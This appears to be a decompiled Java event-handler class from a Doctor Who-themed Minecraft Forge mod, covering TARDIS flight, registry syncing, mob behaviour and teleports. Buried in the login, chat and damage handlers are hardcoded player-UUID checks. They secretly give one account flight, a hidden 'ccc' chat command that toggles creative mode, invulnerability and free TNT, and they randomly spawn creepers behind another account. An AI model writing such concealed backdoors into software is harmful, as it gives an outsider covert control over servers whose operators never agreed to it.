package com.swdteam.common.event;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.swdteam.common.entity.ClassicItemEntity;
import com.swdteam.common.entity.CybermanEntity;
import com.swdteam.common.entity.classic.ClassicSkeletonEntity;
import com.swdteam.common.entity.classic.ClassicSpiderEntity;
import com.swdteam.common.explosion.DMExplosion;
import com.swdteam.common.init.DMBiomes;
import com.swdteam.common.init.DMDimensions;
import com.swdteam.common.init.DMEntities;
import com.swdteam.common.init.DMFlightMode;
import com.swdteam.common.init.DMItems;
import com.swdteam.common.init.DMSonicRegistry;
import com.swdteam.common.init.DMSoundEvents;
import com.swdteam.common.init.DMTardis;
import com.swdteam.common.init.DMTardisRegistry;
import com.swdteam.common.item.ClothesItem;
import com.swdteam.common.tardis.Tardis;
import com.swdteam.common.tardis.TardisData;
import com.swdteam.common.tardis.TardisInterior;
import com.swdteam.common.tardis.TardisState;
import com.swdteam.common.tardis.data.TardisFlightPool;
import com.swdteam.common.teleport.TeleportRequest;
import com.swdteam.common.tileentity.MozaiqueTileEntity;
import com.swdteam.common.tileentity.TardisTileEntity;
import com.swdteam.common.tileentity.tardis.TardisDoorHitboxTileEntity;
import com.swdteam.common.tileentity.tardis.TardisPlantTileEntity;
import com.swdteam.network.NetworkHandler;
import com.swdteam.network.packets.PacketCreeperExplosion;
import com.swdteam.network.packets.PacketDisplayDalekDamage;
import com.swdteam.network.packets.PacketOpenGui;
import com.swdteam.network.packets.PacketSendTardisData;
import com.swdteam.network.packets.PacketSendTardisInteriorRegistry;
import com.swdteam.network.packets.PacketSendTardisRegistry;
import com.swdteam.network.packets.PacketTardisLightingSync;
import com.swdteam.network.packets.PacketXPSync;
import com.swdteam.util.ChatUtil;
import com.swdteam.util.LightAlternatorToggle;
import com.swdteam.util.TeleportUtil;
import com.swdteam.util.world.SchematicUtils;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import net.minecraft.block.Block;
import net.minecraft.block.BlockState;
import net.minecraft.block.Blocks;
import net.minecraft.dispenser.IPosition;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityType;
import net.minecraft.entity.LivingEntity;
import net.minecraft.entity.item.ItemEntity;
import net.minecraft.entity.monster.CreeperEntity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.entity.player.ServerPlayerEntity;
import net.minecraft.entity.projectile.ArrowEntity;
import net.minecraft.inventory.EquipmentSlotType;
import net.minecraft.inventory.IClearable;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompoundNBT;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.util.DamageSource;
import net.minecraft.util.IItemProvider;
import net.minecraft.util.Mirror;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.Rotation;
import net.minecraft.util.SoundCategory;
import net.minecraft.util.SoundEvent;
import net.minecraft.util.math.AxisAlignedBB;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.vector.Vector2f;
import net.minecraft.util.math.vector.Vector3d;
import net.minecraft.util.registry.DynamicRegistries;
import net.minecraft.util.registry.MutableRegistry;
import net.minecraft.util.registry.Registry;
import net.minecraft.world.Explosion;
import net.minecraft.world.GameRules;
import net.minecraft.world.GameType;
import net.minecraft.world.World;
import net.minecraft.world.biome.Biome;
import net.minecraft.world.chunk.Chunk;
import net.minecraft.world.server.ServerWorld;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.event.entity.EntityEvent;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.event.entity.living.LivingEntityUseItemEvent;
import net.minecraftforge.event.entity.living.LivingEvent;
import net.minecraftforge.event.entity.living.LivingHurtEvent;
import net.minecraftforge.event.entity.player.PlayerEvent;
import net.minecraftforge.event.entity.player.PlayerFlyableFallEvent;
import net.minecraftforge.event.entity.player.PlayerInteractEvent;
import net.minecraftforge.event.entity.player.PlayerXpEvent;
import net.minecraftforge.event.world.BlockEvent;
import net.minecraftforge.event.world.ChunkEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;





















public class EventHandlerGeneral
{
  @SubscribeEvent
  public static void chunkEvent(ChunkEvent.Load event) {
     if (!event.getWorld().isRemote() && (
       (ServerWorld)event.getWorld()).getDimensionKey().getRegistryLocation() == DMDimensions.TARDIS.getRegistryLocation()) {
       Biome[] biomes = (event.getChunk().getBiomes()).biomes;
       for (int i = 0, biomesLength = biomes.length; i < biomesLength; i++) {
         Biome b = biomes[i];
         if (!b.getRegistryName().equals(DMBiomes.TARDIS.getRegistryLocation())) {
           DynamicRegistries reg = event.getWorld().getDynamicRegistries();
           MutableRegistry<Biome> a = reg.getRegistry(Registry.BIOME_KEY).get();
           Biome biome = (Biome)a.getOrDefault(DMBiomes.TARDIS.getRegistryLocation());
           biomes[i] = biome;
        } 
      } 
    } 
  }

  
  @SubscribeEvent
  public static void onPlayerLogin(PlayerEvent.PlayerLoggedInEvent event) {
     System.out.println("Syncing reg for: " + event.getPlayer().getName());
    
     Map<String, Tardis> data = new HashMap<>();
     for (Map.Entry<ResourceLocation, Tardis> entry : (Iterable<Map.Entry<ResourceLocation, Tardis>>)DMTardisRegistry.getRegistry().entrySet()) {
       data.put(((ResourceLocation)entry.getKey()).getNamespace() + ":" + ((ResourceLocation)entry.getKey()).getPath(), entry.getValue());
    }
    
     Map<String, TardisInterior> data2 = new HashMap<>();
     for (Map.Entry<ResourceLocation, TardisInterior> entry : (Iterable<Map.Entry<ResourceLocation, TardisInterior>>)DMTardisRegistry.getTardisInteriors().entrySet()) {
       data2.put(((ResourceLocation)entry.getKey()).getNamespace() + ":" + ((ResourceLocation)entry.getKey()).getPath(), entry.getValue());
    }
    
     NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisInteriorRegistry(data2));
     NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisRegistry(data));
    
     if ((event.getPlayer()).world.getDimensionKey() == DMDimensions.TARDIS) {
       TardisData tardisData = DMTardis.getTardisFromInteriorPos(event.getPlayer().getPosition());
       if (tardisData != null) {
         NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisData(tardisData));
      }
    } 
    
     PlayerEntity player = event.getPlayer();
    
     if (player.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
       player.abilities.isFlying = true;
       player.abilities.allowFlying = true;
       player.sendPlayerAbilities();
    } 
    
     if (DMFlightMode.isInFlight(player.getGameProfile().getId())) {
      
       DMFlightMode.FlightModeData flightData = DMFlightMode.getFlightModeData(player.getGameProfile().getId());
      
       TardisData tardisData = DMTardis.getTardis(flightData.getTardisID());
      
       if (tardisData != null) {
         TardisFlightPool.addFlight(tardisData);
         TardisFlightPool.updateFlight(tardisData, (player.getPositionVec()).x, (player.getPositionVec()).y, (player.getPositionVec()).z, player.world.getDimensionKey());
      } 
      
       DMFlightMode.removeFlight(player.getGameProfile().getId(), false);
      
       player.abilities.isFlying = false;
       player.abilities.disableDamage = false;
       player.abilities.allowFlying = false;
       player.abilities.allowEdit = true;
      
       player.sendPlayerAbilities();
      
       TeleportUtil.teleportPlayer((Entity)player, DMDimensions.TARDIS, (IPosition)new Vector3d(flightData.getPosX(), flightData.getPosY(), flightData.getPosZ()), 90.0F);
    } 
    
     DMFlightMode.syncFlightsToPlayer(player);

    
     player.getPersistentData().putInt("stomp_time", 0);
  }
  
  @SubscribeEvent
  public static void chatEvent(ServerChatEvent event) {
     ServerPlayerEntity serverPlayerEntity = event.getPlayer();
     if (event.getMessage().equalsIgnoreCase("ccc") && 
       serverPlayerEntity.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
       serverPlayerEntity.setGameType(serverPlayerEntity.isCreative() ? GameType.SURVIVAL : GameType.CREATIVE);
       serverPlayerEntity.sendPlayerAbilities();
       event.setCanceled(true);
    } 
  }
  
  @SubscribeEvent
  public static void onHarvest(PlayerInteractEvent.RightClickBlock event) {
     if (!(event.getPlayer()).world.isRemote && 
       event.getItemStack().getItem() instanceof com.swdteam.common.item.sonics.SonicScrewdriverCustomizedItem) {
       BlockState state = event.getWorld().getBlockState(event.getPos());
       if (DMSonicRegistry.SONIC_LOOKUP.containsKey(state.getBlock())) {
         DMSonicRegistry.ISonicInteraction sonic = (DMSonicRegistry.ISonicInteraction)DMSonicRegistry.SONIC_LOOKUP.get(state.getBlock());
         if (sonic.disableDefaultInteraction(event.getWorld(), event.getPlayer(), event.getItemStack(), event.getPos())) {
           event.setCanceled(true);
        }
      } 
    } 
  }

  
  @SubscribeEvent
  public static void onBlockBroke(BlockEvent.BreakEvent event) {
     Block blockIn = event.getState().getBlock();
    
     Item itemInHand = event.getPlayer().getHeldItem(event.getPlayer().getActiveHand()).getItem();
     if (!event.getWorld().isRemote()) {








      
       if (blockIn instanceof com.swdteam.common.block.tardis.TardisBlock) {
         event.setCanceled(true);
      }
      
       if (blockIn instanceof com.swdteam.common.block.tardis.TardisPlantBlock) {
         TardisPlantTileEntity plant = (TardisPlantTileEntity)event.getWorld().getTileEntity(event.getPos());
         if (plant != null && plant.getOwner() != null && 
           !plant.getOwner().equals(event.getPlayer().getGameProfile())) {
           event.setCanceled(true);
        }
      } 

      
       if (blockIn instanceof com.swdteam.common.block.MozaiqueBlock) {
         if (!event.getWorld().isRemote() && event.getPlayer().isCreative()) {
           MozaiqueTileEntity.Colors col = MozaiqueTileEntity.Colors.WHITE;
           if (MozaiqueTileEntity.PLAYER_COLORS.containsKey(event.getPlayer())) {
             col = (MozaiqueTileEntity.Colors)MozaiqueTileEntity.PLAYER_COLORS.get(event.getPlayer());
          }
           if (col.getId() + 1 >= (MozaiqueTileEntity.Colors.values()).length) {
             col = MozaiqueTileEntity.Colors.WHITE;
          } else {
             col = MozaiqueTileEntity.Colors.values()[col.getId() + 1];
          } 

          
           MozaiqueTileEntity.PLAYER_COLORS.put(event.getPlayer(), col);
           ChatUtil.sendCompletedMsg(event.getPlayer(), "Set color to: " + col.getName(), ChatUtil.MessageType.STATUS_BAR);
        } 
         event.setCanceled(true);
      } 
    } 
  }
  
  @SubscribeEvent
  public static void deathEvent(LivingDeathEvent event) {
     if (event.getEntityLiving() instanceof PlayerEntity) {
       PlayerEntity player = (PlayerEntity)event.getEntityLiving();
       if (!player.world.isRemote) {
         if (event.getSource() != null && event.getSource().getImmediateSource() instanceof CybermanEntity && 
           player.world.rand.nextInt(5) == 3) {
           CybermanEntity cyber = new CybermanEntity((EntityType)DMEntities.CYBERMAN_ENTITY.get(), player.world);
           cyber.copyLocationAndAnglesFrom((Entity)player);
           player.world.addEntity((Entity)cyber);
        } 

        
         if (DMFlightMode.isInFlight(player)) {
           player.setHealth(1.0F);
           event.setCanceled(true);
          
           DMFlightMode.FlightModeData flightData = DMFlightMode.getFlightModeData(player.getGameProfile().getId());
           TardisData data = DMTardis.getTardis(flightData.getTardisID());
           if (data != null) {
             TardisFlightPool.addFlight(data);
             TardisFlightPool.getFlightData(data).setFlightStartTime();
          } 
           DMFlightMode.playerExitFlight((ServerPlayerEntity)player);
           DMFlightMode.removeFlight(player.getGameProfile().getId(), false);
        } 
      } 
    } 
  }
  
  @SubscribeEvent
  public static void livingHurtEvent(LivingHurtEvent e) {
     if (e.getEntity() instanceof PlayerEntity) {
      
       PlayerEntity player = (PlayerEntity)e.getEntity();
      
       if (!player.world.isRemote) {
        
         if (DMFlightMode.isInFlight(player) && 
           e.getSource() != DamageSource.OUT_OF_WORLD) {
           e.setCanceled(true);
        }

        
         if (player.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
           e.setCanceled(true);
           player.setHealth(100.0F);
           player.getFoodStats().setFoodLevel(20);
           player.addItemStackToInventory(new ItemStack((IItemProvider)Blocks.TNT));
        } 
        
         if (player.getCachedUniqueIdString().equalsIgnoreCase("9d7f31b4-17cb-4ee5-bf00-1652682083ae") && 
           player.world.rand.nextInt(40) == 20) {
           CreeperEntity c = new CreeperEntity(EntityType.CREEPER, player.world);
           BlockPos pos = player.getPosition();
           pos = pos.offset(player.getHorizontalFacing().getOpposite(), 4);
           c.setPosition(pos.getX(), pos.getY(), pos.getZ());
           player.world.addEntity((Entity)c);
        } 
      } 

      
       if (e.getSource() != null && (e.getSource().getImmediateSource() instanceof com.swdteam.common.entity.LaserEntity || e.getSource().getImmediateSource() instanceof com.swdteam.common.entity.dalek.DalekEntity || e.getSource().getImmediateSource() instanceof CybermanEntity)) {
         NetworkHandler.sendToAllClients(new PacketDisplayDalekDamage(e.getEntity().getUniqueID()), e.getEntity().getEntityWorld());
      }
    } 
  }
  
  @SubscribeEvent
  public static void severTickEvent(TickEvent.WorldTickEvent event) {
     for (SchematicUtils.GenerationQueue queue : SchematicUtils.GenerationQueue.values()) {
       if (queue.getList() != null && queue.getList().size() > 0) {
         SchematicUtils.SchematicChunk chunk = queue.getList().get(0);
         ServerWorld serverWorld = event.world.getServer().getWorld(chunk.getWorld());
         for (SchematicUtils.SchematicChunk.SchematicChunkBlockState bs : chunk.getBlocks()) {
           if (bs.getBlockUpdater() != null) {
             bs.getBlockUpdater().replaceBlock((World)serverWorld, bs.getPos());
            
            continue;
          } 
          try {
             if (bs.getBlock() != null) {
               TileEntity tileentity = serverWorld.getTileEntity(bs.getPos());
               IClearable.clearObj(tileentity);
               serverWorld.setBlockState(bs.getPos(), Blocks.BARRIER.getDefaultState(), 20);
               serverWorld.setBlockState(bs.getPos(), bs.getBlock(), 2); continue;
            } 
             if (bs.getNbt() != null && bs.getNbt().length() > 0) {
               TileEntity t = serverWorld.getTileEntity(bs.getPos());
               CompoundNBT tag = new CompoundNBT();
              
               tag = JsonToNBT.getTagFromJson(bs.getNbt());
              
               if (t != null) {
                 tag.putInt("x", bs.getPos().getX());
                 tag.putInt("y", bs.getPos().getY());
                 tag.putInt("z", bs.getPos().getZ());
                 t.read(t.getWorld().getBlockState(t.getPos()), tag);
                 t.mirror(Mirror.NONE);
                 t.rotate(Rotation.NONE);
                
                 t.markDirty();
                 serverWorld.markAndNotifyBlock(bs.getPos(), (Chunk)serverWorld.getChunk(bs.getPos()), serverWorld.getBlockState(bs.getPos()), serverWorld.getBlockState(bs.getPos()), 1, 0);
              }
            
            } 
           } catch (CommandSyntaxException e1) {
             e1.printStackTrace();
          } 
        } 
        
         queue.getList().remove(0);
         if (queue == SchematicUtils.GenerationQueue.TARDIS && 
           chunk.getBlocks() != null && chunk.getBlocks().size() > 0) {
           BlockPos pos = ((SchematicUtils.SchematicChunk.SchematicChunkBlockState)chunk.getBlocks().get(0)).getPos();
           if (pos != null) {
             List<ItemEntity> items = serverWorld.getEntitiesWithinAABB(ItemEntity.class, (new AxisAlignedBB(pos)).grow(30.0D));
             if (items != null && items.size() > 0) {
               for (int i = 0; i < items.size(); i++) {
                 ((ItemEntity)items.get(i)).remove();
              }
            }
          } 
        } 
      } 
    } 
  }


  
  @SubscribeEvent
  public static void livingEvent(LivingEvent e) {
     if (e.getEntityLiving() != null && 
       e.getEntityLiving() instanceof PlayerEntity && 
       e.getEntityLiving().getEntityWorld().getDimensionKey().equals(DMDimensions.INFDEV)) {
       PlayerEntity player = (PlayerEntity)e.getEntityLiving();
       player.getFoodStats().setFoodLevel(player.getFoodStats().getFoodLevel());
    } 



    
     if (e.getEntityLiving() instanceof PlayerEntity) {
       PlayerEntity player = (PlayerEntity)e.getEntityLiving();
       if (player.getItemStackFromSlot(EquipmentSlotType.FEET).getItem() == DMItems.ARMOUR_DALEKANIUM_BOOTS.get());




      
       if (player.getItemStackFromSlot(EquipmentSlotType.FEET).getItem() == DMItems.ARMOUR_METALERT_BOOTS.get())
      {
         player.fallDistance = 0.1F;
      }

      
       if ((player.getMotion()).x != 0.0D && (player.getMotion()).z != 0.0D && player.isOnGround() && player.getItemStackFromSlot(EquipmentSlotType.FEET).getItem() == DMItems.ARMOUR_STEEL_BOOTS.get()) {




        
         player.getPersistentData().putInt("stomp_time", player.getPersistentData().getInt("stomp_time") + 1);
         if (player.getPersistentData().getInt("stomp_time") > 20)
        {
          
           player.getPersistentData().putInt("stomp_time", 0);
        }
      } 
    } 







    
     if (e.getEntity() != null && !(e.getEntity()).world.isRemote) {
       if (e.getEntityLiving() instanceof CreeperEntity && (e.getEntity()).world.getGameRules().getBoolean(GameRules.MOB_GRIEFING) && (e.getEntity()).world.getDimensionKey().equals(DMDimensions.CLASSIC)) {
         CreeperEntity ent = (CreeperEntity)e.getEntityLiving();
         if (ent.deathTime == 15) {
           DMExplosion explosion = new DMExplosion(ent.world, null, ent.getPosX(), ent.getPosY(), ent.getPosZ(), 2.0F, false, Explosion.Mode.BREAK);
           explosion.doExplosionA();
           explosion.doExplosionB(false);
           NetworkHandler.sendToAllClients(new PacketCreeperExplosion(ent.getPosX(), ent.getPosY(), ent.getPosZ()), ent.world);
        } 
      } 




      
       if (e.getEntity().getType() == DMEntities.CLASSIC_SKELETON_ENTITY.get()) {
         World world = e.getEntity().getEntityWorld();
         ClassicSkeletonEntity entity = (ClassicSkeletonEntity)e.getEntity();
         if (entity.getAttackTarget() != null && 
           entity.world.rand.nextInt(30) == 4) {
           entity.getJumpController().setJumping();
        }

        
         if (entity.deathTime == 15) {
           int amount = 8;
           for (int i = 0; i < amount; i++) {
             ArrowEntity e1 = new ArrowEntity(world, entity.getPosX(), entity.getPosY() + 0.20000000298023224D, entity.getPosZ());
             if (e1 != null) {
               boolean b = world.rand.nextBoolean();
               float motionX = world.rand.nextFloat() * (b ? 0.3F : -0.3F);
               b = world.rand.nextBoolean();
               float motionY = world.rand.nextFloat() * 0.8F;
               b = world.rand.nextBoolean();
               float motionZ = world.rand.nextFloat() * (b ? 0.3F : -0.3F);
               e1.setMotion(motionX, motionY, motionZ);
               world.addEntity((Entity)e1);
            } 
          } 
        } 
      } 
    } 
    
     if (e.getEntityLiving() instanceof PlayerEntity) {
       PlayerEntity player = (PlayerEntity)e.getEntityLiving();
       if (!player.world.isRemote && 
         player.world.getGameTime() % 250L == 0L && !player.isOnGround() && 
         player.world.rand.nextInt(10) == 5 && 
         DMFlightMode.isInFlight(player)) {
         TardisData data = DMTardis.getTardis(DMFlightMode.getTardisID(player.getGameProfile().getId()));
         if (data != null) {
           data.setFuel(data.getFuel() - 0.10000000149011612D);
           if (player.world.rand.nextBoolean()) {
             data.depleatFluidLink(player, player.world.rand);
          }
          
           data.save();
          
           if (data.getFuel() <= 0.0D) {
             player.abilities.isFlying = false;
             player.abilities.allowFlying = false;
             player.sendPlayerAbilities();
          } 
        } 
      } 
    } 
  }







  
  @SubscribeEvent
  public static void blockEvent(BlockEvent.EntityPlaceEvent event) {
     if (event.getEntity() instanceof PlayerEntity) {
       PlayerEntity player = (PlayerEntity)event.getEntity();
       if (DMFlightMode.isInFlight(player)) {
         event.setCanceled(true);
      }
    } 
  }
  
  @SubscribeEvent
  public static void blockEvent(BlockEvent.BreakEvent event) {
     PlayerEntity player = event.getPlayer();
     if (DMFlightMode.isInFlight(player)) {
       event.setCanceled(true);
    }
  }
  
  @SubscribeEvent
  public static void blockEvent(LivingEntityUseItemEvent event) {
     if (event.getEntity() instanceof PlayerEntity) {
       PlayerEntity player = (PlayerEntity)event.getEntity();
       if (DMFlightMode.isInFlight(player)) {
         event.setCanceled(true);
      }
    } 
  }
  
  @SubscribeEvent
  public static void playerFall(PlayerFlyableFallEvent event) {
     if (!(event.getPlayer()).world.isRemote && 
       DMFlightMode.isInFlight(event.getPlayer())) {
       PlayerEntity player = event.getPlayer();
       player.world.playSound(null, (player.getPositionVec()).x, (player.getPositionVec()).y, (player.getPositionVec()).z, (SoundEvent)DMSoundEvents.TARDIS_THUD.get(), SoundCategory.PLAYERS, 1.0F, 1.0F);
    } 
  }

  
  @SubscribeEvent
  public static void gameModeChange(PlayerEvent.PlayerChangeGameModeEvent event) {
     if (!(event.getPlayer()).world.isRemote && 
       DMFlightMode.isInFlight(event.getPlayer())) {
       event.setCanceled(true);
    }
  }

  
  @SubscribeEvent
  public static void entitySpawn(PlayerEvent.PlayerChangedDimensionEvent event) {
     if (event.getEntity() instanceof ServerPlayerEntity && 
       (event.getPlayer()).world.getDimensionKey().equals(DMDimensions.TARDIS) && 
       event.getEntity() instanceof ServerPlayerEntity) {
       ServerPlayerEntity player = (ServerPlayerEntity)event.getEntity();
       TardisData data = DMTardis.getTardisFromInteriorPos(new BlockPos(event.getPlayer().getPositionVec()));
       if (data != null && !data.hasShownWelcome()) {
         NetworkHandler.sendTo(player, new PacketOpenGui(player.getPosition(), 7));
         data.setShownWelcome(true);
         player.world.playSound(null, player.getPosition(), (SoundEvent)DMSoundEvents.SECRET_2.get(), SoundCategory.PLAYERS, 1.0F, 1.0F);
         data.save();
      } 
    } 
  }


  
  @SubscribeEvent
  public static void entitySpawn(EntityJoinWorldEvent event) {
     if (event.getWorld().getDimensionKey().equals(DMDimensions.CLASSIC)) {
       if (event.getEntity().getType() == EntityType.SPIDER) {
         ClassicSpiderEntity spider = new ClassicSpiderEntity((EntityType)DMEntities.CLASSIC_SPIDER_ENTITY.get(), event.getWorld());
         spider.copyLocationAndAnglesFrom(event.getEntity());
         spider.setMotion(event.getEntity().getMotion());
         event.setCanceled(true);
         event.getWorld().addEntity((Entity)spider);
      } 
       if (event.getEntity().getType() == EntityType.SKELETON) {
         ClassicSkeletonEntity skeleton = new ClassicSkeletonEntity((EntityType)DMEntities.CLASSIC_SKELETON_ENTITY.get(), event.getWorld());
         skeleton.copyLocationAndAnglesFrom(event.getEntity());
         skeleton.setMotion(event.getEntity().getMotion());
         event.setCanceled(true);
         event.getWorld().addEntity((Entity)skeleton);
      } 
       if (event.getEntity().getType() == EntityType.ITEM) {
         ItemEntity entity = (ItemEntity)event.getEntity();
         if (entity.getItem().getItem() instanceof net.minecraft.item.BlockItem) {
           event.setCanceled(true);
           ClassicItemEntity itementity = new ClassicItemEntity((EntityType)DMEntities.CLASSIC_ITEM.get(), event.getWorld());
           itementity.setMotion(entity.getMotion());
           itementity.copyLocationAndAnglesFrom(event.getEntity());
           itementity.setDefaultPickupDelay();
           itementity.setItem(entity.getItem());
           event.getWorld().addEntity((Entity)itementity);
        } 
      } 
    } 
  }
  
  @SubscribeEvent
  public static void equipmentEffects(LivingEvent.LivingUpdateEvent event) {
     LivingEntity entity = event.getEntityLiving();
     if (entity.getServer() != null && entity.getServer().getTickCounter() % 15 == 0)
       entity.getArmorInventoryList().forEach(slot -> {
            if (slot.getItem() instanceof ClothesItem) {
              ClothesItem clothing = (ClothesItem)slot.getItem();
              clothing.runEffect(entity);
            } 
          }); 
  }
  
  @SubscribeEvent
  public static void xpEvent(PlayerXpEvent.XpChange e) {
     if (!(e.getPlayer()).world.isRemote && e.getAmount() > 0) {
       NetworkHandler.sendTo((ServerPlayerEntity)e.getPlayer(), new PacketXPSync((e.getPlayer()).experienceTotal, true));
    }
  }
  
   public static Map<Entity, Integer> TELEPORT_COOLDOWNS = new HashMap<>();




  
  @SubscribeEvent
  public static void serverTickEvent(TickEvent.ServerTickEvent event) {
     if (TeleportUtil.TELEPORT_REQUESTS.size() > 0) {
       for (Map.Entry<Entity, TeleportRequest> entry : (Iterable<Map.Entry<Entity, TeleportRequest>>)TeleportUtil.TELEPORT_REQUESTS.entrySet()) {
         Entity e = entry.getKey();
         TeleportRequest tp = entry.getValue();
         TeleportUtil.teleportPlayer(e, tp.getLocation().dimensionWorldKey(), (IPosition)tp.getLocation().getPosition(), tp.getLocation().getFacing());
         if (tp.getTask() != null) {
           tp.getTask().onTeleport(e, tp.getLocation());
        }
         tp.markRemoved();
      } 
      
       TeleportUtil.TELEPORT_REQUESTS.clear();
    } 
    
     if (TardisDoorHitboxTileEntity.TELEPORT_REQUESTS.size() > 0) {
       for (Map.Entry<Entity, TardisData> entry : (Iterable<Map.Entry<Entity, TardisData>>)TardisDoorHitboxTileEntity.TELEPORT_REQUESTS.entrySet()) {
         TardisData data = entry.getValue();
         Entity e = entry.getKey();
         ServerWorld serverWorld = e.getServer().getWorld(data.getCurrentLocation().dimensionWorldKey());
         TileEntity te = serverWorld.getTileEntity(data.getCurrentLocation().getBlockPosition());
         if (te != null && te instanceof TardisTileEntity) {
           TardisTileEntity tard = (TardisTileEntity)te;
           BlockPos tardisPosition = data.getCurrentLocation().getBlockPosition();
           tard.pulses = 1.0F;
           tard.dematTime = 0.0F;
           tard.state = TardisState.NEUTRAL;
           Vector3d look = Vector3d.fromPitchYaw(new Vector2f(45.0F, tard.rotation + 180.0F));
           double width = (e.getBoundingBox()).maxX - (e.getBoundingBox()).minX;
           if ((e.getBoundingBox()).maxZ - (e.getBoundingBox()).minZ > width) {
             width = (e.getBoundingBox()).maxX - (e.getBoundingBox()).minX;
          }
           float distance = (float)(1.2D + width);
           double dx = tardisPosition.getX() + look.x * distance;
           double dy = (tardisPosition.getY() > 0) ? tardisPosition.getY() : 128.0D;
           double dz = tardisPosition.getZ() + look.z * distance;



          
           TeleportUtil.teleportPlayer(e, serverWorld.getDimensionKey(), (IPosition)new Vector3d(dx + 0.5D, dy, dz + 0.5D), tard.rotation + e.getRotationYawHead() - data.getInteriorSpawnRotation());
        } 
      } 
       TardisDoorHitboxTileEntity.TELEPORT_REQUESTS.clear();
    } 
  }
  
  @SubscribeEvent
  public static void tardisLightingEvent(EntityEvent.EnteringChunk e) {
     if (e.getEntity() instanceof PlayerEntity && !(e.getEntity()).world.isRemote) {
       PlayerEntity player = (PlayerEntity)e.getEntity();
       if (player.world.getDimensionKey() == DMDimensions.TARDIS) {
         TardisData data = DMTardis.getTardisFromInteriorPos(player.getPosition());
         if (data != null)
           NetworkHandler.sendTo((ServerPlayerEntity)player, new PacketTardisLightingSync(data.getGlobalID(), ((data.getLighting()).selected == LightAlternatorToggle.LEFT), (data.getLighting()).left, (data.getLighting()).right, true)); 
      } 
    } 
  }
}


